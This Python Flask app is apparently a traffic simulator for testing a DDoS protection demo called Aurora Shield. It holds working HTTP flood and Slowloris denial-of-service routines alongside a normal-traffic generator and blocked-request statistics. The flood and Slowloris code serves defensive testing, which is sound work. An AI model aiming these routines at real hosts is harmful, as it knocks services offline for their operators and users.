#!/usr/bin/env python3
"""
Web-based Attack Simulator for Aurora Shield Demo
Interactive interface to configure and launch various attack patterns
"""

from flask import Flask, render_template, request, jsonify, Response
import asyncio
import aiohttp
import requests
import time
import random
import os
import threading
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import queue

app = Flask(__name__)

class AttackSimulator:
    def __init__(self):
        # Target the aurora-shield through load balancer
        self.target_host = os.getenv('TARGET_HOST', 'aurora-shield')
        self.target_port = os.getenv('TARGET_PORT', '8080')
        self.lb_host = os.getenv('LB_HOST', 'load-balancer')
        self.lb_port = os.getenv('LB_PORT', '80')
        
        self.aurora_url = f"http://{self.target_host}:{self.target_port}"
        self.lb_url = f"http://{self.lb_host}:{self.lb_port}"
        
        # Attack state management
        self.active_attacks = {}
        self.attack_results = queue.Queue()
        self.request_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'blocked_requests': 0,
            'start_time': None
        }
        
    def reset_stats(self):
        """Reset attack statistics"""
        self.request_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'blocked_requests': 0,
            'start_time': datetime.now()
        }
    
    def log_request(self, success=True, blocked=False):
        """Log request statistics"""
        self.request_stats['total_requests'] += 1
        if blocked:
            self.request_stats['blocked_requests'] += 1
        elif success:
            self.request_stats['successful_requests'] += 1
        else:
            self.request_stats['failed_requests'] += 1
    
    def stop_attack(self, attack_id):
        """Stop a running attack"""
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['stop'] = True
            return True
        return False
    
    def start_http_flood(self, attack_id, config):
        """Start HTTP flood attack"""
        def run_flood():
            self.active_attacks[attack_id] = {'stop': False, 'type': 'http_flood'}
            rate = config.get('rate', 10)
            duration = config.get('duration', 30)
            target = config.get('target', 'aurora')
            
            url = self.aurora_url if target == 'aurora' else self.lb_url
            
            start_time = time.time()
            request_count = 0
            
            print(f"🚨 Starting HTTP Flood: {rate} req/s for {duration}s targeting {url}")
            
            while (time.time() - start_time < duration and 
                   not self.active_attacks[attack_id].get('stop', False)):
                
                # Send requests in batches
                for _ in range(rate):
                    if self.active_attacks[attack_id].get('stop', False):
                        break
                    
                    try:
                        response = requests.get(f"{url}/", timeout=2)
                        request_count += 1
                        
                        # Check if request was blocked by Aurora Shield
                        blocked = 'blocked' in response.text.lower() or response.status_code == 429
                        self.log_request(success=(response.status_code == 200), blocked=blocked)
                        
                    except Exception as e:
                        self.log_request(success=False)
                
                time.sleep(1)
            
            del self.active_attacks[attack_id]
            print(f"✅ HTTP Flood completed: {request_count} requests sent")
        
        thread = threading.Thread(target=run_flood)
        thread.daemon = True
        thread.start()
    
    def start_slowloris(self, attack_id, config):
        """Start Slowloris attack"""
        def run_slowloris():
            self.active_attacks[attack_id] = {'stop': False, 'type': 'slowloris'}
            connections = config.get('connections', 10)
            duration = config.get('duration', 30)
            target = config.get('target', 'aurora')
            
            host = self.target_host if target == 'aurora' else self.lb_host
            port = int(self.target_port) if target == 'aurora' else int(self.lb_port)
            
            print(f"🐌 Starting Slowloris: {connections} connections for {duration}s")
            
            import socket
            sockets = []
            
            # Create initial connections
            for _ in range(connections):
                if self.active_attacks[attack_id].get('stop', False):
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((host, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
                    sockets.append(sock)
                    self.log_request()
                except:
                    self.log_request(success=False)
            
            start_time = time.time()
            while (time.time() - start_time < duration and 
                   not self.active_attacks[attack_id].get('stop', False)):
                
                # Keep connections alive
                for sock in sockets:
                    try:
                        sock.send(b"X-Keep-Alive: 300\r\n")
                    except:
                        pass
                
                time.sleep(5)
            
            # Close all sockets
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            del self.active_attacks[attack_id]
            print(f"✅ Slowloris completed")
        
        thread = threading.Thread(target=run_slowloris)
        thread.daemon = True
        thread.start()
    
    def start_normal_traffic(self, attack_id, config):
        """Start normal traffic simulation"""
        def run_normal():
            self.active_attacks[attack_id] = {'stop': False, 'type': 'normal'}
            rate = config.get('rate', 2)
            duration = config.get('duration', 60)
            target = config.get('target', 'aurora')
            
            url = self.aurora_url if target == 'aurora' else self.lb_url
            
            endpoints = ['/', '/health', '/api/status']
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            start_time = time.time()
            request_count = 0
            
            print(f"🌐 Starting Normal Traffic: {rate} req/s for {duration}s targeting {url}")
            
            while (time.time() - start_time < duration and 
                   not self.active_attacks[attack_id].get('stop', False)):
                
                try:
                    endpoint = random.choice(endpoints)
                    headers = {'User-Agent': random.choice(user_agents)}
                    
                    response = requests.get(f"{url}{endpoint}", 
                                          headers=headers, timeout=5)
                    request_count += 1
                    
                    blocked = 'blocked' in response.text.lower() or response.status_code == 429
                    self.log_request(success=(response.status_code == 200), blocked=blocked)
                    
                except Exception as e:
                    self.log_request(success=False)
                
                time.sleep(60 / rate)  # Maintain specified rate
            
            del self.active_attacks[attack_id]
            print(f"✅ Normal Traffic completed: {request_count} requests")
        
        thread = threading.Thread(target=run_normal)
        thread.daemon = True
        thread.start()

# Global simulator instance
simulator = AttackSimulator()

@app.route('/')
def index():
    """Main dashboard page"""
    return render_template('attack_simulator.html')

@app.route('/api/status')
def get_status():
    """Get current attack status and statistics"""
    active_count = len(simulator.active_attacks)
    stats = simulator.request_stats.copy()
    
    if stats['start_time']:
        stats['duration'] = (datetime.now() - stats['start_time']).total_seconds()
    else:
        stats['duration'] = 0
    
    # Calculate rates
    if stats['duration'] > 0:
        stats['request_rate'] = stats['total_requests'] / stats['duration']
    else:
        stats['request_rate'] = 0
    
    return jsonify({
        'active_attacks': active_count,
        'attack_types': [attack['type'] for attack in simulator.active_attacks.values()],
        'statistics': stats,
        'aurora_url': simulator.aurora_url,
        'lb_url': simulator.lb_url
    })

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    """Start a new attack"""
    data = request.json
    attack_type = data.get('type')
    config = data.get('config', {})
    attack_id = f"{attack_type}_{int(time.time())}"
    
    # Reset stats if this is the first attack
    if len(simulator.active_attacks) == 0:
        simulator.reset_stats()
    
    if attack_type == 'http_flood':
        simulator.start_http_flood(attack_id, config)
    elif attack_type == 'slowloris':
        simulator.start_slowloris(attack_id, config)
    elif attack_type == 'normal':
        simulator.start_normal_traffic(attack_id, config)
    else:
        return jsonify({'error': 'Unknown attack type'}), 400
    
    return jsonify({
        'success': True,
        'attack_id': attack_id,
        'message': f'Started {attack_type} attack'
    })

@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    """Stop a specific attack"""
    data = request.json
    attack_id = data.get('attack_id')
    
    if attack_id and simulator.stop_attack(attack_id):
        return jsonify({'success': True, 'message': f'Stopped attack {attack_id}'})
    else:
        return jsonify({'error': 'Attack not found or already stopped'}), 404

@app.route('/api/stop_all', methods=['POST'])
def stop_all_attacks():
    """Stop all active attacks"""
    attack_ids = list(simulator.active_attacks.keys())
    for attack_id in attack_ids:
        simulator.stop_attack(attack_id)
    
    return jsonify({
        'success': True,
        'message': f'Stopped {len(attack_ids)} attacks'
    })

@app.route('/api/reset_stats', methods=['POST'])
def reset_stats():
    """Reset attack statistics"""
    simulator.reset_stats()
    return jsonify({'success': True, 'message': 'Statistics reset'})

if __name__ == '__main__':
    print("🚀 Starting Aurora Shield Attack Simulator Web Interface...")
    print(f"   Aurora Shield URL: {simulator.aurora_url}")
    print(f"   Load Balancer URL: {simulator.lb_url}")
    print("   Web Interface: http://localhost:5001")
    
    app.run(host='0.0.0.0', port=5001, debug=False)